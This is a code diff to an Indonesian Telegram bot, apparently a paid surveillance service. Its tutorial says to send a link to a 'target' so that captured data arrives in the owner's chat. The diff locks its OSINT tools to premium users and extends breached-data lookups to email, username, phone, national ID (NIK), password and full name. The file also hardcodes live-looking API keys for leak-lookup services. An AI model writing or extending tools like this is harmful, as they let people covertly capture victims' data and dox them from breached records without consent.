@@ -51,11 +51,11 @@ GROUP_ID   = "-5591690895"
 DATA_FILE  = "data.json"
 FREE_LIMIT = 3
 
-RAPIDAPI_KEY  = "227f756b50mshbfbd6f18ab7cf41p17b064jsn0ade51590aae"
-LEAKCHECK_KEY = "cfb68818f2ed5b9a0fd216be3dfb637981aa2c3c"
-LEAKCHECK_API_KEY =  "cfb68818f2ed5b9a0fd216be3dfb637981aa2c3c"
-LEAKLOOKUP_KEY  = "8a909832ba40615144bfc9b87a3b1e0b"
-ABSTRACTAPI_KEY = "c602e4705c3e4dbd8acbe35d10a40da7"
+RAPIDAPI_KEY      = "227f756b50mshbfbd6f18ab7cf41p17b064jsn0ade51590aae"
+LEAKCHECK_KEY     = "99aed655fc285391368f32a9d1bb6d67c01a0a18"
+LEAKCHECK_API_KEY = "cfb68818f2ed5b9a0fd216be3dfb637981aa2c3c"
+LEAKLOOKUP_KEY    = "8a909832ba40615144bfc9b87a3b1e0b"
+ABSTRACTAPI_KEY   = "c602e4705c3e4dbd8acbe35d10a40da7"
 
 PREMIUM_DURATIONS = {
     "1d":  ("1 Hari",    1),
@@ -281,12 +281,12 @@ Ketik /start untuk membuka panel utama.
 Salin link → kirim ke target.
 Data masuk otomatis ke chat kamu.
 
-*5️⃣ OSINT TOOLS*
+*5️⃣ OSINT TOOLS (PREMIUM/ADMIN)*
 Tekan tombol 🔍 OSINT Tools di panel utama.
 Fitur tersedia:
 • Username Finder (500+ situs)
 • Breach Check (HIBP + BD + LC)
-• Cek Data Bocor (Email/Username/HP/NIK/Password)
+• Cek Data Bocor (Email/Username/HP/NIK/Password/Nama)
 • Phone Lookup (WA, TG, fintech)
 • Profile Scraper
 • Google Dorking
@@ -999,7 +999,7 @@ async def _send_offline(link_id, owner_uid):
     total = _cap_counts.get(link_id, 0)
     await bot.send_message(chat_id=owner_uid,
         text=f"🔴 *Target offline* (Link #{link_id})\nTotal capture: {total}", parse_mode="Markdown")
-    # ================================================================== #
+# ================================================================== #
 #  FLASK
 # ================================================================== #
 def make_flask_app(link_id, owner_uid):
@@ -1172,6 +1172,17 @@ def kb_osint():
          InlineKeyboardButton("🏥 BPJS Search",      callback_data="o_bpjs")],
         [InlineKeyboardButton("🕵️ Full OSINT",       callback_data="o_full")],
         [InlineKeyboardButton("« Kembali",           callback_data="back_main")],
+    ])
+
+def kb_bocor():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("📧 Cek Email", callback_data="bocor_email"),
+         InlineKeyboardButton("👤 Cek Username", callback_data="bocor_username")],
+        [InlineKeyboardButton("📱 Cek No. HP", callback_data="bocor_phone"),
+         InlineKeyboardButton("🪪 Cek NIK", callback_data="bocor_nik")],
+        [InlineKeyboardButton("🔑 Cek Password", callback_data="bocor_password"),
+         InlineKeyboardButton("📛 Cari by Nama", callback_data="bocor_nama")],
+        [InlineKeyboardButton("« Kembali", callback_data="osint_menu")],
     ])
 
 def kb_template():
@@ -1397,7 +1408,7 @@ def run_osint_full(uid, username, email, nomor, bot_token):
         await bot.send_message(chat_id=uid,
             text=f"✅ *Full OSINT Selesai*\n\n{laporan}", parse_mode="Markdown")
     asyncio.run(_run())
-    # ================================================================== #
+# ================================================================== #
 #  HANDLERS — /start
 # ================================================================== #
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1453,9 +1464,12 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await q.edit_message_text(teks, parse_mode="Markdown", reply_markup=kb_main(uid))
 
     # ============================================================
-    #  OSINT MENU
+    #  OSINT MENU (DIKUNCI)
     # ============================================================
     elif d == "osint_menu":
+        if role not in ("admin", "premium"):
+            await q.answer("❌ Fitur OSINT hanya untuk Premium & Admin.\nUpgrade dulu lewat menu utama.", show_alert=True)
+            return
         await q.edit_message_text(
             "🔍 *OSINT Tools — MR414N-ID*\n\nPilih fitur:",
             parse_mode="Markdown", reply_markup=kb_osint())
@@ -1472,20 +1486,12 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
         _user_state[uid] = None
         await q.edit_message_text(
             "💧 *Cek Data Bocor — MR414N-ID*\n\nPilih jenis data:",
-            parse_mode="Markdown",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("📧 Email", callback_data="bocor_email"),
-                 InlineKeyboardButton("👤 Username", callback_data="bocor_username")],
-                [InlineKeyboardButton("📱 Nomor HP", callback_data="bocor_phone"),
-                 InlineKeyboardButton("🪪 NIK", callback_data="bocor_nik")],
-                [InlineKeyboardButton("🔑 Password", callback_data="bocor_password")],
-                [InlineKeyboardButton("« Kembali", callback_data="osint_menu")],
-            ]))
+            parse_mode="Markdown", reply_markup=kb_bocor())
 
-    elif d in ("bocor_email","bocor_username","bocor_phone","bocor_nik","bocor_password"):
+    elif d in ("bocor_email","bocor_username","bocor_phone","bocor_nik","bocor_password","bocor_nama"):
         kind = d.replace("bocor_", "")
         _user_state[uid] = f"bocor_await_{kind}"
-        lbl = {"email":"Email","username":"Username","phone":"Nomor HP","nik":"NIK","password":"Password"}[kind]
+        lbl = {"email":"Email","username":"Username","phone":"Nomor HP","nik":"NIK","password":"Password","nama":"Nama Lengkap"}[kind]
         await q.edit_message_text(
             f"💧 *Cek Data Bocor — {lbl}*\n\nKetik yang mau dicek:",
             parse_mode="Markdown",
@@ -1743,7 +1749,13 @@ async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(TUTORIAL_TEXT, parse_mode="Markdown",
                 reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Kembali", callback_data="back_main")]]))
         elif text == "🔍 OSINT Tools":
-            db_ensure_user(uid)
+            db_ensure_user(uid); role = db_get_role(uid)
+            if role not in ("admin", "premium"):
+                await update.message.reply_text(
+                    "❌ Fitur OSINT hanya untuk Premium & Admin.\n"
+                    "Silakan upgrade akun kamu terlebih dahulu."
+                )
+                return
             await update.message.reply_text(
                 "🔍 *OSINT Tools — MR414N-ID*\n\nPilih fitur:",
                 parse_mode="Markdown", reply_markup=kb_osint())
@@ -1763,7 +1775,7 @@ async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "Bot ini hanya dapat digunakan oleh member yang telah terdaftar.\n\n"
                 "🎁 FREE ACCESS\n"
                 "• Limit penggunaan: 3 Link\n"
-                "• Upgrade Premium untuk mendapatkan limit lebih besar.\n\n"
+                "• Upgrade Premium untuk mendapatkan limit lebih besar & akses OSINT Tools.\n\n"
                 "🚀 MULAI SEKARANG\n"
                 "👉 Ketik /start untuk memulai.\n\n"
                 "⚠️ Gunakan seluruh fitur hanya pada perangkat dan lokasi yang Anda miliki atau dengan persetujuan pemiliknya.\n\n"
@@ -1846,9 +1858,9 @@ async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         kind = state.replace("bocor_await_", "")
         _user_state[uid] = None
         cfg = {
-    "leaklookup": LEAKLOOKUP_KEY, 
-    "abstractapi": ABSTRACTAPI_KEY,
-    "leakcheck_api": LEAKCHECK_API_KEY
+            "leaklookup": LEAKLOOKUP_KEY, 
+            "abstractapi": ABSTRACTAPI_KEY,
+            "leakcheck_api": LEAKCHECK_API_KEY
         }
         threading.Thread(target=run_bocor,
                          args=(uid, text, kind, BOT_TOKEN, cfg), daemon=True).start()
